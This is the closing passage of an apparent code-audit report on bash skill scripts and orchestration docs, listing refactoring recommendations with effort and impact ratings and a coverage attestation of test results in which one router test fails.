4. **Strengthen `check-hook-templates.sh` (effort S, impact med).** Add a `shellcheck --shell=bash` pass (available in CI) and a grep for bash-4-only constructs (`,,}`, `^^}`, `declare -A`, `[-1]`) and for unguarded `timeout`/`flock`/`realpath -m`.
5. **Shared test library (effort S, impact med).** The `assert_eq`, `assert_contains`, `assert_rc` and `assert_file` helpers are copied into 9 files with inconsistent argument order (prune-remote-test uses name,want,got). Extract them to `skills/test-lib.sh` (sourced by tests only).
6. **One test runner in CI (effort S, impact high).** Add `tools/run-skill-tests.sh` that discovers `*-test.sh`/`test-*.sh` and runs them all. Wire it into smoke.yml (finding 24).
7. **dag-lib as pure jq (effort S, impact med).** Cycle detection is a ~15-line recursive jq function over the edge list. That removes the bash-4.3 dependency and the 110-line DFS, and a dedicated `dag-lib-test.sh` should cover check-cycle, ready-set and status-of.
8. **Unify the task identity model (effort M, impact high).** Store `plan_ordinal`, `taskcreate_id` and `task_id` (compound, plan-ordinal-based) in `task-store.sh create`, and make kickoff and orchestrate share one "Step 7 task graph" fragment instead of two drifting copies (kickoff L714–808 vs 07-tasks.md).
9. **Deduplicate kickoff ↔ orchestrate Steps 4–7 (effort L, impact med).** Orchestrate 04–07 says "Use /kickoff logic but adapted", but actually re-implements it with drift: no finder, no Step 4b API gate, a different plan-path contract. Make `/orchestrate` standard-tier call the kickoff protocol fragments (or vice versa), leaving one PM/TL/finder spawn block and one spec/plan contract.
10. **Autopilot envelope macro (effort S, impact med).** The C3 §2 envelope and halt boilerplate is repeated about 12× across 02/06/08/09/11 and kickoff. Define it once in `cross-cutting.md` as "Autopilot off-triad halt(gate, BC, signal)" and reference it in one line per site.
11. **Skill-lint rule for use-before-assign in a fence and for `$VAR` suppressed by `lint-ok: C1` (effort M, impact high).** Findings 3, 8, 12 and 20 all come from cross-fence variable assumptions that the linter was told to ignore. Require literal `<PLACEHOLDER>` tokens instead of `$VAR` when the value comes from a prior fence.

## Coverage attestation

- Files in slice list (`06-orchestrate.txt`): **47**
- Rows in per-file table: **47**
- Every file was read in full (large files in chunks). Test and tool runs recorded:
  - `escalation-gate-test.sh`: PASS=40 FAIL=0
  - `test-disclose-force.sh`: PASS=33 FAIL=0
  - `test-normalize-hook-paths.sh`: PASS=32 FAIL=0
  - `test-orch-allowlist.sh`: PASS=24 FAIL=0
  - `test-signing-sandbox.sh`: PASS=88 FAIL=0
  - `test-sweep-legacy-orphans.sh`: PASS=47 FAIL=0
  - `task-store-test.sh`: PASS=33 FAIL=0
  - `prune-remote-test.sh`: PASS=61 FAIL=0
  - **`router-static-test.sh`: PASS=15 FAIL=1** (T10)
  - `check-hook-templates.sh`: OK
  - `bash -n` on all slice scripts: clean
  - `shellcheck -S warning`: only SC1007 (intentional `CDPATH=`) and SC2088 (intentional literal `~`), including on the 8 extracted hook templates.
